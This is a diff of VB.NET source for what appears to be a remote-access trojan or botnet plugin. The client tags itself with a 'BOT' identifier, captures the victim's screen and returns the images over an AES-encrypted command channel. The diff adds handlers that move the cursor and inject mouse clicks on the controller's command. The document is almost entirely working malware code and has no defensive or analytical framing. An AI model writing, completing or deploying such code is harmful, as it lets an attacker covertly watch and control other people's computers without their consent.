@@ -43,7 +43,7 @@ Public Class Main
             Alive = True
             cap.Clear()
             Dim s = Screen.PrimaryScreen.Bounds.Size
-            Send("!" & SPL & HWID & SPL & s.Width & SPL & s.Height)
+            Send("!" & SPL & BOT & SPL & s.Width & SPL & s.Height)
         Catch ex As Exception
         End Try
         GoTo re
@@ -101,10 +101,8 @@ cc:
         End Try
     End Sub
 
-
-    Public Shared bmb = New List(Of Byte())()
+    Declare Sub mouse_event Lib "user32" Alias "mouse_event" (ByVal dwFlags As Integer, ByVal dx As Integer, ByVal dy As Integer, ByVal cButtons As Integer, ByVal dwExtraInfo As Integer)
     Public Shared cap As New CRDP
-    Public Shared Bb As Byte()
     Public Shared Sub Data(ByVal b As Byte())
         Dim A As String() = Split(AES_Decrypt(BS(b)), SPL)
 
@@ -115,12 +113,19 @@ cc:
                     Dim SizeOfimage As Integer = A(1)
                     Dim Split As Integer = A(2)
                     Dim Quality As Integer = A(3)
-
                     Dim Bb As Byte() = cap.Cap(SizeOfimage, Split, Quality)
-                    Dim obj As List(Of Byte()) = bmb
-                    SyncLock obj
-                        Send("@" + SPL + HWID + SPL + BS(Bb))
-                    End SyncLock
+
+                    Send("@" + SPL + BOT + SPL + Text.Encoding.Default.GetString(Bb))
+                    Exit Select
+
+                Case "#" ' mouse clicks
+                    Cursor.Position = New Drawing.Point(A(1), A(2))
+                    mouse_event(A(3), 0, 0, 0, 1)
+                    Exit Select
+
+                Case "$" '  mouse move
+                    Cursor.Position = New Drawing.Point(A(1), A(2))
+                    Exit Select
 
                 Case "Close"
                     CloseMe()
@@ -164,11 +169,11 @@ cc:
     Public Shared Alive As Boolean = False
 
     Public Shared Function SB(ByVal s As String) As Byte()
-        Return Text.Encoding.Default.GetBytes(s)
+        Return Text.Encoding.UTF8.GetBytes(s)
     End Function
 
     Public Shared Function BS(ByVal b As Byte()) As String
-        Return Text.Encoding.Default.GetString(b)
+        Return Text.Encoding.UTF8.GetString(b)
     End Function
 
     Public Shared Function AES_Encrypt(ByVal input As String)
